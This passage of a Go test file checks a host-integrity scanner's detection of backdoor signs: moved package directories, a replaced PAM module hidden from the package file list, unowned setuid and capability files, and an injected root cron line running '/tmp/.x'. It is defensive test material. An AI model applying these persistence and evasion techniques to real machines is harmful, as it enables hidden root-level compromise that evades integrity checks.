		{"unfollowed outside the system directories", "/opt/q/mawk", nil, nil, model.SevBackdoor, "outside the system directories"},
	} {
		c := clean()
		c.Files = append(c.Files, dirAt("/etc/alternatives"), file("/usr/bin/mawk", "mawk", 0o755), symlinkAt(alt, tc.target, changed))
		c.Files = append(c.Files, tc.extra...)
		c.LinkMissing = tc.missing
		f := find(run(c, snapOf(clone(old)), archive()), snapKey)
		if f == nil || f.Severity != tc.sev || !strings.Contains(f.Why, tc.why) {
			t.Errorf("%s: want %q (%q), got %+v", tc.name, tc.sev, tc.why, f)
		}
	}

	// zlib1g's soname link through /run/systemd, with and without an upgrade
	// of the package: never folded into the package change, never a note.
	const zlink, zfile = "/usr/lib/x86_64-linux-gnu/libz.so.1", "/usr/lib/x86_64-linux-gnu/libz.so.1.2.13"
	const newVersion = "1:1.2.13.dfsg-1+deb12u1"
	mk := func(version, content string, extra ...model.FileEntry) *model.Collection {
		c := clean()
		c.Files = append(c.Files, file(zfile, content, 0o644))
		c.Files = append(c.Files, extra...)
		c.Packages.Installed = append(c.Packages.Installed, pkg("zlib1g", version, zlink, zfile))
		return c
	}
	snapC := func() *model.Snapshot {
		return snapOf(mk("1:1.2.13.dfsg-1", "zlib old", symlinkAt(zlink, "libz.so.1.2.13", taken)))
	}
	bent := symlinkAt(zlink, "/run/systemd/q/libz.so.1.2.13", changed)
	for name, r := range map[string]*model.Report{
		"with the upgrade":  run(mk(newVersion, "zlib new", bent), snapC(), archive(verdict(zfile, "zlib1g", newVersion, "zlib new"))),
		"no package change": run(mk("1:1.2.13.dfsg-1", "zlib old", bent), snapC(), archive()),
	} {
		if f := find(r, "snap.file_modified:"+zlink); f == nil || f.Severity != model.SevBackdoor || !strings.Contains(f.Why, "cannot be told") {
			t.Errorf("zlib soname link, %s: want a backdoor sign, got %+v", name, f)
		}
		for _, f := range r.Explained {
			if hasEvidencePath(&f, zlink) {
				t.Errorf("zlib soname link, %s: explained by %s", name, f.Key)
			}
		}
	}
}

// A setuid file behind a package directory that was moved is not "unowned"
// when package verification compared it, where it really is, with the signed
// package and found it the package's own: the moved directory is already
// reported. The machine's own checksums, which root can edit, prove nothing
// of the kind, and neither does the absence of a verdict. A file capability
// is never cleared this way: package verification compares content and mode,
// not capabilities, so a verified file can carry one the package never gave.
func TestVerifiedFileBehindAMovedDirectoryIsNotUnowned(t *testing.T) {
	const lit, phys = "/opt/google/chrome/chrome-sandbox", "/data/opt/google/chrome/chrome-sandbox"
	const capLit, capPhys = "/opt/google/chrome/nethelper", "/data/opt/google/chrome/nethelper"
	mk := func() *model.Collection {
		c := clean()
		helper := file(capPhys, "nethelper", 0o755)
		helper.Caps = "cap_net_raw=ep"
		c.Files = append(c.Files, symlinkAt("/opt", "/data/opt", taken), file(phys, "sandbox", 0o4755), helper)
		c.Packages.Installed = append(c.Packages.Installed, pkg("google-chrome-stable", "131.0-1", "/opt", "/opt/google", "/opt/google/chrome", lit, capLit))
		return c
	}
	signed := func(src string) *pkgverify.Result {
		a, b := verdict(phys, "google-chrome-stable", "131.0-1", "sandbox"), verdict(capPhys, "google-chrome-stable", "131.0-1", "nethelper")
		a.Source, b.Source = src, src
		res := archive(a, b)
		if src == pkgverify.SourceOfflineLocal {
			res.Mode = pkgverify.ModeOfflineLocal
		}
		return res
	}
	for _, src := range []string{pkgverify.SourceArchive, pkgverify.SourceRefs, pkgverify.SourceSnapshot} {
		r := run(mk(), nil, signed(src))
		absent(t, r, "heur.unowned_setuid:"+phys)
		must(t, r, "heur.unowned_caps:"+capPhys, model.SevBackdoor)
		must(t, r, "pkg.dir_now_link:/opt", model.SevNote)
	}
	// Only the machine's own checksums say so.
	r := run(mk(), nil, signed(pkgverify.SourceOfflineLocal))
	must(t, r, "heur.unowned_setuid:"+phys, model.SevBackdoor)
	must(t, r, "heur.unowned_caps:"+capPhys, model.SevBackdoor)
	// Nothing says so.
	r = run(mk(), nil, archive())
	must(t, r, "heur.unowned_setuid:"+phys, model.SevBackdoor)
	must(t, r, "heur.unowned_caps:"+capPhys, model.SevBackdoor)
	// The verdict is about another content than the file has now.
	stale := signed(pkgverify.SourceArchive)
	stale.Verified[0].Actual, stale.Verified[0].Expected = h("older"), h("older")
	must(t, run(mk(), nil, stale), "heur.unowned_setuid:"+phys, model.SevBackdoor)
	// A verified file that is not behind any package path stays unowned: a
	// verdict alone is not what clears it.
	c := mk()
	c.Files = append(c.Files, file("/srv/x/sandbox", "sandbox", 0o4755))
	res := signed(pkgverify.SourceArchive)
	res.Verified = append(res.Verified, verdict("/srv/x/sandbox", "google-chrome-stable", "131.0-1", "sandbox"))
	must(t, run(c, nil, res), "heur.unowned_setuid:/srv/x/sandbox", model.SevBackdoor)
}

// A package directory moved to where the file scan does not go: the files
// behind the link are compared with the package only if the collector got an
// entry for each. One listed file without an entry (it is missing, on a
// mount the collector stays out of, or past its budget) means nobody looked
// at what the package's name now leads to, and the note would be a lie.
func TestPackageDirectoryLinkWithFilesNotLookedAt(t *testing.T) {
	const sec = "/usr/lib/x86_64-linux-gnu/security"
	const key = "pkg.dir_now_link:" + sec
	mk := func(extra ...model.FileEntry) *model.Collection {
		c := clean()
		c.Files = append(c.Files, dirAt("/usr/lib"), dirAt("/usr/lib/x86_64-linux-gnu"), symlinkAt(sec, "/srv/pam", taken), dirAt("/srv"), dirAt("/srv/pam"))
		c.Files = append(c.Files, extra...)
		c.Packages.Installed = append(c.Packages.Installed, pkg("libpam-modules", "1.5.2-6", sec, sec+"/pam_unix.so", sec+"/pam_deny.so", sec+"/sub", sec+"/sub/x.so"))
		return c
	}
	unix, deny, sub := file("/srv/pam/pam_unix.so", "unix", 0o644), file("/srv/pam/pam_deny.so", "deny", 0o644), file("/srv/pam/sub/x.so", "x", 0o644)
	// Every listed file has an entry where it really is.
	must(t, run(mk(unix, deny, sub), nil, archive()), key, model.SevNote)
	// None has.
	f := must(t, run(mk(), nil, archive()), key, model.SevBackdoor)
	if f != nil && (!strings.Contains(f.Why, "could not be checked") || !slices.ContainsFunc(f.Evidence, func(e model.Evidence) bool { return e.Path == sec+"/pam_unix.so" })) {
		t.Errorf("the finding does not say which files were not checked: %s / %+v", f.Why, f.Evidence)
	}
	// One is missing.
	f = must(t, run(mk(unix, sub), nil, archive()), key, model.SevBackdoor)
	if f != nil && (!slices.ContainsFunc(f.Evidence, func(e model.Evidence) bool { return e.Path == sec+"/pam_deny.so" }) ||
		slices.ContainsFunc(f.Evidence, func(e model.Evidence) bool { return e.Path == sec+"/pam_unix.so" })) {
		t.Errorf("evidence should name pam_deny.so only: %+v", f.Evidence)
	}
	// A link where the package has a file is an entry: package verification
	// reports the difference.
	must(t, run(mk(unix, sub, symlinkAt("/srv/pam/pam_deny.so", "/var/lib/x/evil", taken)), nil, archive()), key, model.SevNote)
}

// /run/user/<uid> and /run/lock are writable by ordinary users.
func TestChangedLinkIntoAUserWritableRuntimeDirectory(t *testing.T) {
	const alt = "/etc/alternatives/awk"
	old := clean()
	old.Files = append(old.Files, dirAt("/etc/alternatives"), symlinkAt(alt, "/usr/bin/mawk", taken), file("/usr/bin/mawk", "mawk", 0o755))
	for target, why := range map[string]string{"/run/user/1000/mawk": "points into /run/user", "/run/lock/mawk": "points into /run/lock"} {
		c := clean()
		c.Files = append(c.Files, dirAt("/etc/alternatives"), file("/usr/bin/mawk", "mawk", 0o755), symlinkAt(alt, target, changed), file(target, "evil", 0o755))
		f := find(run(c, snapOf(clone(old)), archive()), "snap.file_modified:"+alt)
		if f == nil || f.Severity != model.SevBackdoor || !strings.Contains(f.Why, why) {
			t.Errorf("%s: want a backdoor sign (%s), got %+v", target, why, f)
		}
	}
}

// Root moves the PAM module directory away, replaces pam_unix.so and deletes
// its line from the package's file list, so nothing lists it and nothing was
// collected for it. The signed package still ships it there: the moved
// directory is a backdoor sign that names the file, not a note.
func TestMovedDirectoryIsBoundedByTheSignedPackageNotTheFileList(t *testing.T) {
	const sec = "/usr/lib/x86_64-linux-gnu/security"
	const key = "pkg.dir_now_link:" + sec
	mk := func() *model.Collection {
		c := clean()
		c.Files = append(c.Files, dirAt("/usr/lib"), dirAt("/usr/lib/x86_64-linux-gnu"), symlinkAt(sec, "/srv/pam", changed), dirAt("/srv"), dirAt("/srv/pam"), file("/srv/pam/pam_deny.so", "deny", 0o644))
		c.Packages.Installed = append(c.Packages.Installed, pkg("libpam-modules", "1.5.2-6", sec, sec+"/pam_deny.so")) // the pam_unix.so line is gone
		return c
	}
	res := archive(verdict("/srv/pam/pam_deny.so", "libpam-modules", "1.5.2-6", "deny"))
	must(t, run(mk(), nil, res), key, model.SevNote)

	res = archive(verdict("/srv/pam/pam_deny.so", "libpam-modules", "1.5.2-6", "deny"))
	// The signed package spells the directory the pre-merge way.
	res.MovedUnseen = []pkgverify.MovedFile{{Path: "/lib/x86_64-linux-gnu/security/pam_unix.so", At: "/srv/pam/pam_unix.so", Package: "libpam-modules", Version: "1.5.2-6"}}
	f := must(t, run(mk(), nil, res), key, model.SevBackdoor)
	if !hasEvidencePath(f, "/lib/x86_64-linux-gnu/security/pam_unix.so") || !strings.Contains(f.Why, "could not be checked") {
		t.Errorf("the finding does not name the file the signed package ships: %s / %+v", f.Why, f.Evidence)
	}
	// A file reported for another place does not count against this link.
	res.MovedUnseen = []pkgverify.MovedFile{{Path: "/opt/x/y", At: "/data/x/y", Package: "x", Version: "1"}}
	must(t, run(mk(), nil, res), key, model.SevNote)

	// The directory is linked to the root directory: the listed files were
	// copied to /, a replaced one planted there and its line deleted from
	// the file list. The file the signed package ships is at /sudoers.so.
	const sudo = "/usr/libexec/sudo"
	root := func(extra ...model.FileEntry) *model.Collection {
		c := clean()
		c.Files = append(c.Files, dirAt("/usr/libexec"), symlinkAt(sudo, "/", changed), file("/sudo_noexec.so", "noexec", 0o644))
		c.Files = append(c.Files, extra...)
		c.Packages.Installed = append(c.Packages.Installed, pkg("sudo-plugins", "1.9", sudo, sudo+"/sudo_noexec.so")) // the sudoers.so line is gone
		return c
	}
	res = archive(verdict("/sudo_noexec.so", "sudo-plugins", "1.9", "noexec"))
	res.MovedUnseen = []pkgverify.MovedFile{{Path: sudo + "/sudoers.so", At: "/sudoers.so", Package: "sudo-plugins", Version: "1.9"}}
	f = must(t, run(root(), nil, res), "pkg.dir_now_link:"+sudo, model.SevBackdoor)
	if !hasEvidencePath(f, sudo+"/sudoers.so") {
		t.Errorf("a signed file below a directory linked to / is not named: %+v", f.Evidence)
	}
	// A package directory that is the root directory now is a backdoor sign
	// by itself, with every listed file present and verified.
	f = must(t, run(root(), nil, archive(verdict("/sudo_noexec.so", "sudo-plugins", "1.9", "noexec"))), "pkg.dir_now_link:"+sudo, model.SevBackdoor)
	if !strings.Contains(f.Why, "root directory") {
		t.Errorf("Why does not say the link leads to the root directory: %s", f.Why)
	}
}

// A PAM module or kernel module that is really behind a moved directory is
// still one: what kind of file it is comes from where dpkg installs it.
func TestSpecialFilesBehindAMovedDirectoryKeepTheirRanking(t *testing.T) {
	const sec = "/usr/lib/x86_64-linux-gnu/security"
	c := clean()
	c.Files = append(c.Files, dirAt("/usr/lib"), dirAt("/usr/lib/x86_64-linux-gnu"), symlinkAt(sec, "/srv/pam", taken), dirAt("/srv"), dirAt("/srv/pam"),
		file("/srv/pam/pam_unix.so", "unix", 0o644), symlinkAt("/usr/lib/modules", "/srv/mod", taken), dirAt("/srv/mod"), dirAt("/srv/mod/6.1"), file("/srv/mod/6.1/x.ko", "ko", 0o644))
	c.Packages.Installed = append(c.Packages.Installed, pkg("libpam-modules", "1.5.2-6+fake", sec, sec+"/pam_unix.so"), pkg("linux-image", "6.1+fake", "/usr/lib/modules", "/usr/lib/modules/6.1", "/usr/lib/modules/6.1/x.ko"))
	res := archive()
	res.Unverifiable = append(res.Unverifiable,
		pkgverify.FileVerdict{Path: "/srv/pam/pam_unix.so", Listed: []string{sec + "/pam_unix.so"}, Package: "libpam-modules", Version: "1.5.2-6+fake", Reason: "version not found", Kind: pkgverify.KindNotFound},
		pkgverify.FileVerdict{Path: "/srv/mod/6.1/x.ko", Listed: []string{"/usr/lib/modules/6.1/x.ko"}, Package: "linux-image", Version: "6.1+fake", Reason: "version not found", Kind: pkgverify.KindNotFound})
	r := run(c, nil, res)
	must(t, r, "pkg.unverifiable:/srv/pam/pam_unix.so", model.SevBackdoor)
	must(t, r, "pkg.unverifiable:/srv/mod/6.1/x.ko", model.SevBackdoor)
}

// A cron file that is a link to a file telltale did not collect: the fix
// cannot name the file to edit, and it says where the added lines are
// listed, never "shown above".
func TestJudgePersistLinkFixSaysWhereTheLinesAre(t *testing.T) {
	link := func(lines ...string) model.PersistFile {
		all := append([]string{"/srv/jobs/backup"}, lines...)
		return model.PersistFile{Path: "/etc/cron.d/backup", Kind: model.PersistKindCron, Mode: 0o120777, SHA256: h(strings.Join(all, "\n")), Lines: all, MTime: changed}
	}
	old := clean()
	old.Persist = []model.PersistFile{link("0 3 * * * root /usr/local/bin/backup")}
	cur := clone(old)
	cur.Persist = []model.PersistFile{link("0 3 * * * root /usr/local/bin/backup", "* * * * * root /tmp/.x")}
	f := must(t, run(cur, snapOf(old), nil), "snap.persist:/etc/cron.d/backup", model.SevBackdoor)
	if !strings.Contains(f.Fix, "which telltale's report lists") || strings.Contains(f.Fix, "shown above") {
		t.Errorf("fix %q", f.Fix)
	}
}

// A persistence fix never points at lines "shown above": an alert shows one
// line of the change, and other outputs put the fix elsewhere.
func TestJudgePersistFixesSayWhereTheLinesAre(t *testing.T) {
	old := clean()
	old.Persist = []model.PersistFile{cron("0 3 * * * root /usr/local/bin/backup")}
	old.Files = append(old.Files, file("/etc/cron.d/backup", "0 3 * * * root /usr/local/bin/backup", 0o644))
	for name, c := range map[string]struct {
		lines []string // nil: the file is gone
		want  string
	}{
		"replaced": {[]string{"* * * * * root /tmp/.x"}, "then edit it back to the snapshot's lines, which telltale's report shows"},
		"added":    {[]string{"0 3 * * * root /usr/local/bin/backup", "* * * * * root /tmp/.x"}, "removes the lines that were added"},
		"removed":  {nil, "telltale's report shows the snapshot's lines"},
	} {
		t.Run(name, func(t *testing.T) {
			cur := clone(old)
			if c.lines == nil {
				cur.Persist = nil
				cur.Files = slices.DeleteFunc(cur.Files, func(f model.FileEntry) bool { return f.Path == "/etc/cron.d/backup" })
			} else {
				cur.Persist = []model.PersistFile{cron(c.lines...)}
				setFile(cur, file("/etc/cron.d/backup", strings.Join(c.lines, "\n"), 0o644))
			}
			f := must(t, run(cur, snapOf(old), nil), "snap.persist:/etc/cron.d/backup", model.SevBackdoor)
			if !strings.Contains(f.Fix, c.want) || strings.Contains(f.Fix, "shown above") {
				t.Errorf("fix %q, want %q", f.Fix, c.want)
			}
		})
	}
}
